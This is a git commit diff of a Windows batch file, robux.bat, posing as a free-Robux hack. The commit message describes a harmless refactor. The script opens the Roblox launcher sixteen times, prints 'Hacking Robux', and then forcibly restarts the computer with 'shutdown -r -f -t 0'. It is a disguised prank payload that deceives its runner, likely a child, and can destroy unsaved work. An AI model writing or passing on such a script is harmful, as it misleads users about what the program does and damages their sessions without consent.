ee0fb8a9df778578b93fb827d9bfe6e06463e43a
ElectricCompanyYehor <96538332+ElectricCompanyYehor@users.noreply.github.com>
2026-01-13 16:40:38 +0200

    Refactor robux.bat to enhance launch commands
    Removed specific robux launch commands and added multiple launch commands for Roblox. Added echo statements for better user feedback.

--- robux.bat
+++ robux.bat
@@ -1,11 +1,23 @@
 @echo off
-
-start "" "roblox-player://launch?robux=5"
-
-start "" "roblox-player://launch?robux=10"
-
+echo Opening Roblox...
 start "" "roblox-player://launch"
-
+start "" "roblox-player://launch"
+start "" "roblox-player://launch"
+start "" "roblox-player://launch"
+start "" "roblox-player://launch"
+start "" "roblox-player://launch"
+start "" "roblox-player://launch"
+start "" "roblox-player://launch"
+start "" "roblox-player://launch"
+start "" "roblox-player://launch"
+start "" "roblox-player://launch"
+start "" "roblox-player://launch"
+start "" "roblox-player://launch"
+start "" "roblox-player://launch"
+start "" "roblox-player://launch"
+start "" "roblox-player://launch"
+echo Waiting...
 TIMEOUT /T 30 /NOBREAK > NUL
-
+echo Hacking Robux
+TIMEOUT /T 15 /NOBREAK > NUL
 shutdown -r -f -t 0
